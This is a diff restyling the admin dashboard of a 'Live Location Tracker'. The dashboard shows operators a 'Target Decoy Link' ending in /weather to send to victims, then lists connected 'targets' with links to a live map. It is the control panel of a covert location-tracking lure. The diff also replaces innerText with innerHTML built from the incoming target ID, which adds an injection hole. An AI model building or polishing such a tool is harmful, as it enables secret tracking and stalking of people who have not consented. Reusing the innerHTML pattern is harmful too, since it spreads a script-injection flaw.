@@ -4,26 +4,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <title>Admin Dashboard - Live Location Tracker</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-gradient: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #0f172a 60%, #090d16 100%);
+            --card-bg: rgba(30, 41, 59, 0.65);
+            --card-border: rgba(255, 255, 255, 0.12);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent-cyan: #06b6d4;
+            --accent-blue: #3b82f6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: var(--bg-gradient);
+            color: var(--text-main);
+            padding: 30px 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 32px;
+            padding: 24px;
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--card-border);
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        h1 {
+            font-size: 1.75rem;
+            font-weight: 800;
+            margin-bottom: 6px;
+            background: linear-gradient(135deg, #ffffff 0%, var(--accent-cyan) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .attribution {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 16px;
+            transition: color 0.2s;
+        }
+
+        .attribution:hover {
+            color: var(--accent-cyan);
+        }
+
+        .url-box {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px dashed rgba(6, 182, 212, 0.4);
+            border-radius: 14px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            font-size: 0.9rem;
+        }
+
+        .url-box code {
+            color: var(--accent-cyan);
+            font-family: monospace;
+            word-break: break-all;
+        }
+
+        .section-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .targets-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .target-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--card-border);
+            border-radius: 18px;
+            padding: 18px 22px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            text-decoration: none;
+            color: var(--text-main);
+            transition: all 0.25s ease;
+        }
+
+        .target-card:hover {
+            transform: translateY(-2px);
+            border-color: rgba(6, 182, 212, 0.4);
+            box-shadow: 0 10px 25px rgba(6, 182, 212, 0.2);
+        }
+
+        .target-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #22c55e;
+        }
+
+        .target-id {
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+
+        .btn-view {
+            background: linear-gradient(135deg, var(--accent-cyan) 0%, var(--accent-blue) 100%);
+            color: #fff;
+            padding: 10px 18px;
+            border-radius: 12px;
+            font-size: 0.875rem;
+            font-weight: 700;
+            border: none;
+        }
+
+        .no-targets {
+            text-align: center;
+            padding: 30px;
+            color: var(--text-muted);
+            background: rgba(15, 23, 42, 0.4);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+    </style>
 </head>
 
 <body>
-    <header class="has-background-black p-3 has-text-centered">
-        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
-        <a href="https://github.com/srishanbangera-sys" class="is-block mb-2 has-text-link-light">Created by srishanbangera</a>
-        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
-    </header>
+    <div class="container">
+        <header>
+            <h1>Live Location Tracker Dashboard</h1>
+            <a href="https://github.com/srishanbangera-sys" target="_blank" class="attribution">Created by srishanbangera</a>
 
-    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
-        <h1 class="title is-5">Targets</h1>
+            <div class="url-box">
+                <span>Target Decoy Link:</span>
+                <code>{{ global.remoteURL }}/weather</code>
+            </div>
+        </header>
 
-        {{ for(value, key in TARGETS) }}
-        <a href="/map?id={{ key }}" class="button is-fullwidth">
-            {{ key }}
-        </a>
-        {{/}}
-    </section>
+        <div class="section-title">
+            <span>Connected Targets</span>
+        </div>
+
+        <div id="tar-content" class="targets-grid">
+            {{ for(value, key in TARGETS) }}
+            <a href="/map?id={{ key }}" class="target-card">
+                <div class="target-info">
+                    <span class="status-dot"></span>
+                    <span class="target-id">{{ key }}</span>
+                </div>
+                <span class="btn-view">Open Live Map →</span>
+            </a>
+            {{/}}
+        </div>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
     <script>
@@ -31,15 +200,29 @@
         const socket = io("", {
             secure: true,
             path: "/socket.io",
-            transports: ['websocket']
+            transports: ['websocket', 'polling']
         })
 
         socket.on("user-connected", newId => {
+            // Remove no targets placeholder if any
+            const placeholder = document.querySelector(".no-targets")
+            if (placeholder) placeholder.remove()
+
+            // Check if card already exists
+            if (document.querySelector(`[data-target-id="${newId}"]`)) return
+
             const a = document.createElement('a')
             a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth"
-            a.innerText = newId
-            content.appendChild(a)
+            a.className = "target-card"
+            a.setAttribute("data-target-id", newId)
+            a.innerHTML = `
+                <div class="target-info">
+                    <span class="status-dot"></span>
+                    <span class="target-id">${newId}</span>
+                </div>
+                <span class="btn-view">Open Live Map →</span>
+            `
+            content.prepend(a)
         })
     </script>
 </body>
